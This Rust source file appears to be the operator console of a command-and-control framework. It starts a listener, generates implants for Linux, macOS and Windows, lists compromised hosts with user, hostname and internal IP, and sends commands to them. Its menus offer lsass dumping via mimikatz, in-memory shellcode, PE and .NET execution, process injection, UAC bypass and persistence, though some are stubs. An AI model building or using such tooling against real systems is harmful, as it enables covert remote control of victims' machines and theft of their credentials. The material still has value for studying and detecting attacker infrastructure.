use actix_web::web;
use rustyline::error::ReadlineError;
use rustyline::Editor;
use server::links::Links;
use std::sync::mpsc;

use prettytable::{format, Table};

// internal packages
use crate::server;
use crate::util;

// banner
fn banner() {
    let banner = r#"
    
_|          _|_|    _|      _|  _|    _|  
_|        _|    _|  _|_|    _|  _|  _|    
_|        _|    _|  _|  _|  _|  _|_|      
_|        _|    _|  _|    _|_|  _|  _|    
_|_|_|_|    _|_|    _|      _|  _|    _|  "#;
    println!("{}", banner);
}

// simple readline utility
pub fn cli_line(prompt: &str) -> Vec<String> {
    use std::io::{stdin, stdout, Write};
    print!("{}", prompt);
    let mut s = String::new();
    let _ = stdout().flush();
    stdin().read_line(&mut s).expect("Did not enter a string");
    if let Some('\n') = s.chars().next_back() {
        s.pop();
    }
    if let Some('\r') = s.chars().next_back() {
        s.pop();
    }
    if s.is_empty() {
        return vec![String::from("")];
    }
    get_string_vec(s)
}

fn get_string_vec(s: String) -> Vec<String> {
    if s.is_empty() {
        return vec![String::from("")];
    }
    s.split_whitespace().map(str::to_string).collect()
}

fn main_help() {
    println!("help");
    println!("  generate            generate link");
    println!("  generate-linux      generate link targeting linux");
    println!("  generate-osx        generate link targeting osx");
    //  TODO
    //println!("  generate-ms         generate link targeting windows (in development)");
    println!("  links               links menu");
    println!("  kill                stop the web server");
    println!("  sharp               generate link");
    println!("  help                this help menu");
    println!("  exit                exits link server");
}

pub async fn main_loop() {
    let (tx, rx) = mpsc::channel();
    let (tx_command, rx_command) = mpsc::channel();

    banner();

    // start server
    let mut args: Vec<String>;
    args = util::cli::cli_line("Start web server (Y/n)? ");
    match args[0].to_lowercase().as_str() {
        "y" => println!("starting server"),
        "n" => {
            println!("not ready it seems?\nexiting...");
            std::process::exit(0);
        }
        _ => (),
    }
    // get bind address
    args = util::cli::cli_line("Please provide bind address (eg: 0.0.0.0:443): ");
    let bind_addr = if args[0].as_str() == "" {
        String::from("0.0.0.0:443")
    } else {
        args[0].clone()
    };
    // initiate
    util::sharp::create_link_dir();
    // spawn server
    let _ = tx_command.send(std::io::stdout());
    let links = server::spawn::spawn_server(&tx, &rx_command, bind_addr).await;
    let srv = rx.recv().unwrap();

    let mut rl = Editor::<()>::new();
    let _ = rl.load_history(".protocol-history.txt");
    loop {
        let readline = rl.readline("🔗 > ");
        match readline {
            Ok(line) => {
                rl.add_history_entry(line.as_str());
                args = get_string_vec(line);
                match args[0].as_str() {
                    "generate" => util::generate::generate(args),
                    "generate-linux" => util::generate::generate_linux(args),
                    "generate-osx" => util::generate::generate_osx(args),
                    //  TODO
                    //"generate-ms" => util::generate::generate_ms(args),
                    "links" => links_loop(links.clone(), args),
                    "kill" => srv.stop(true).await,
                    "sharp" => util::sharp::sharpcollection_manage(args),
                    // add are you sure y/N
                    "help" => main_help(),
                    "exit" => std::process::exit(0),
                    _ => continue,
                }
            }
            Err(ReadlineError::Interrupted) => {
                println!("CTRL-C");
                break;
            }
            Err(ReadlineError::Eof) => {
                // TODO
                // perform check instead of killing process
                println!("CTRL-D");
                break;
            }
            Err(err) => {
                println!("Error: {:?}", err);
                break;
            }
        }
    }
}

// lonks cli
fn links_help() {
    println!("lonks [switch] <argument>");
    println!("  -h    help");
    println!("  -a    show all lonks");
    println!("  -i    interact with lonk (eg: link -i 1)");
    println!("  -k    kill lonk");
}

fn links_menu_help() {
    println!("Lonk commands:");
    println!("  mimikatz            perform MiniDump on lsass and parse locally with pypykatz");
    println!("  procdump            MiniDump a process in memory");
    println!("  execute-assembly    execute .NET assembly in memory");
    println!("  execute-shellcode   execute shellcode in memory and return standard output/error");
    println!("  execute-pe          execute Windows PE in memory");
    println!("  powerpick           execute PowerShell without powershell.exe");
    println!("  persist             persistence modules");
    println!("  bypass-uac          bypass UAC");
    println!("  link-inject         inject link into process");
    println!("  inject              process injection");
    println!("  sharp               SharpCollection tools");
    println!("  sassykitdi          ala sassykitdi");
    println!("  cmd                 execute command directly from process");
    println!("  shell               execute command via cmd.exe");
    println!("  powershell          execute command via powershell.exe");
    println!("  cd                  change directory");
    println!("  pwd                 print working directory");
    println!("  ls                  list directory");
    println!("  pid                 print PID");
    println!("  whoami              whoami");
    println!("  integrity           mandatory integrity control token");
    println!("  kill                exit link");
    println!("  help                show help");
    println!("  ?                   show help");
    println!("  info                show info");
    println!("  back                main menu");
}

fn links_menu_help_nix() {
    println!("Lonk commands:");
    println!("  persist             persistence modules");
    println!("  cd                  change directory");
    println!("  pwd                 print working directory");
    println!("  ls                  list directory");
    println!("  pid                 print PID");
    println!("  whoami              whoami");
    println!("  kill                exit lonk");
    println!("  help                show help");
    println!("  ?                   show help");
    println!("  info                show info");
    println!("  back                main menu");
}

fn link_info(links: web::Data<Links>, link_index: usize) {
    println!("{:#?}", links.links.lock().unwrap()[link_index])
}

fn links_loop(links: web::Data<Links>, args: Vec<String>) {
    if args.len() == 1 {
        links_list(links, false);
        return;
    }
    // parse args
    let mut args: Vec<String> = args;
    let target_link: String;
    if args.len() == 2 {
        match args[1].as_str() {
            "-h" => {
                links_help();
                return;
            }
            "-a" => {
                links_list(links, true);
                return;
            }
            _ => {
                links_help();
                return;
            }
        }
    } else if args.len() == 3 {
        match args[1].as_str() {
            "-i" => target_link = args[2].to_string(),
            "-k" => target_link = args[2].to_string(),
            _ => {
                links_help();
                return;
            }
        }
    } else {
        links_help();
        return;
    }
    // check if lonk exists
    let mut link_exists = false;
    let mut link_index: usize = 0;
    let link_count = *links.count.lock().unwrap() as usize;
    for i in 0..link_count {
        if links.links.lock().unwrap()[i as usize].name == target_link {
            link_exists = true;
            link_index = i;
            break;
        }
    }
    if !link_exists {
        println!("link does not exist");
        return;
    }

    let mut rl = Editor::<()>::new();
    let _ = rl.load_history(".protocol-history.txt");
    let link_prompt = format!("({}) 🔗 > ", target_link);
    loop {
        // print task output
        // perform asyncronously, dependent on
        // add link id
        let readline = rl.readline(link_prompt.as_str());
        match readline {
            Ok(line) => {
                rl.add_history_entry(line.as_str());
                args = get_string_vec(line);
                match args[0].as_str() {
                    "execute-assembly" => {
                        util::nonstd::execute_assembly(links.clone(), link_index, args)
                    }
                    "mimikatz" => util::nonstd::mimikatz(links.clone(), link_index, args),
                    "procdump" => util::nonstd::procdump(links.clone(), link_index, args),
                    "execute-pe" => util::nonstd::execute_pe(links.clone(), link_index, args),
                    "execute-shellcode" => util::nonstd::execute_shellcode(links.clone(), link_index, args),
                    "powerpick" => println!("todo"),
                    // have pre generated DLLs for dropping
                    // teams and other programs commonly used
                    // junction folders, startup and registry
                    "persist" => println!("todo"),
                    "bypass-uac" => println!("todo"),
                    "link-inject" => util::nonstd::link_inject(links.clone(), link_index, args),
                    "inject" => util::nonstd::process_inject(links.clone(), link_index, args),
                    "sharp" => util::sharp::sharp_link(links.clone(), link_index, args),
                    "sassykitdi" => println!("Ring0 link only"),
                    "cmd" => link_command(links.clone(), link_index, args),
                    "shell" => link_command(links.clone(), link_index, args),
                    "powershell" => link_command(links.clone(), link_index, args),
                    "cd" => link_command(links.clone(), link_index, args),
                    "pwd" => link_command(links.clone(), link_index, args),
                    "ls" => link_command(links.clone(), link_index, args),
                    "pid" => link_command(links.clone(), link_index, args),
                    "whoami" => link_command(links.clone(), link_index, args),
                    "integrity" => link_command(links.clone(), link_index, args),
                    // do a check on this before exiting link
                    "kill" => link_command(links.clone(), link_index, vec!["exit".to_string()]),
                    "help" => {
                        let platform = links.links.lock().unwrap()[link_index].platform.clone();
                        if platform == "windows" {
                            links_menu_help();
                        } else {
                            links_menu_help_nix();
                        }
                    }
                    "?" => links_menu_help(),
                    "info" => link_info(links.clone(), link_index),
                    "back" => return,
                    _ => continue,
                }
            }
            Err(ReadlineError::Interrupted) => {
                println!("CTRL-C");
                break;
            }
            Err(ReadlineError::Eof) => {
                println!("CTRL-D");
                break;
            }
            Err(err) => {
                println!("Error: {:?}", err);
                break;
            }
        }
    }
}

fn link_command(links: web::Data<Links>, link_index: usize, command: Vec<String>) {
    if command.len() > 1 && command[1] == "-h" {
        // match command help
        println!("{} help", command[0]);
        return;
    }
    links.links.lock().unwrap()[link_index].set_command(command.join(" "), command.join(" "));
}

fn links_list(links: web::Data<Links>, all: bool) {
    let count = *links.count.lock().unwrap();
    if count == 0 {
        println!("No links.");
        return;
    } else if count == 1 {
        println!("\n[{} Link]\n", count);
    } else {
        println!("\n[{} Links]\n", count);
    }

    // create table
    let mut table = Table::new();
    table.set_format(*format::consts::FORMAT_NO_BORDER);
    table.add_row(row!["id", "type", "platform", "who", "internal ip", "last checkin", "status"]);
    
    // add links
    for i in 0..count {
        let iu = i as usize;
        let mut tmp = links.links.lock().unwrap();
        tmp[iu].check_status();
        if !all && tmp[iu].status != server::links::LinkStatus::Active {
            continue;
        }
        table.add_row(row![
            tmp[iu].name,
            Fr -> format!("{:?}", tmp[iu].link_type),
            tmp[iu].platform,
            FB -> format!("{}\\{}", tmp[iu].link_hostname, tmp[iu].link_username),
            tmp[iu].internal_ip,
            Fc -> tmp[iu].last_checkin,
            bFg -> format!("{:?}", tmp[iu].status),
        ]);
    }
    table.printstd();
    println!();
}
